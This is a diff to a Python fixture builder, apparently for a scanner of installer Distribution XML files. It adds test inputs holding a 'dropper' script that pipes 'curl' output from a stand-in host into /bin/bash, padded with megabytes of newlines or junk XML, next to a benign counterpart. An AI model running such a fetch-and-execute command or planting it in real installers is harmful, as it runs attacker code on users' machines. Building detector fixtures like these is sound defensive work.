@@ -63,6 +63,14 @@ def build():
         b'<a><script>system.run("/bin/bash", "-c", "curl -fsSL '
         b'https://example-cdn.invalid/a.sh | /bin/bash");</script></a>')
 
+    # Dropper Distribution followed by 5 MiB of newlines: a ~250 byte stream
+    # that exceeds any entry budget (nothing committed for the output).
+    dist = (b'<a><script>system.run("/bin/bash", "-c", "curl -fsSL '
+            b'https://example-cdn.invalid/a.sh | /bin/bash");</script></a>')
+    c["distribution_big"] = (None, bz2.compress(dist + b"\n" * (5 << 20)))
+    # Same, then junk that is not well-formed XML after the whitespace.
+    add("distribution_junk_tail", dist + b"\n" * 400 + b"<" * 3000)
+
     # The benign counterpart (the installer_distribution_js_ordinary fixture's).
     add("distribution_ordinary", (
         b'<?xml version="1.0" encoding="utf-8" standalone="yes"?>\n'
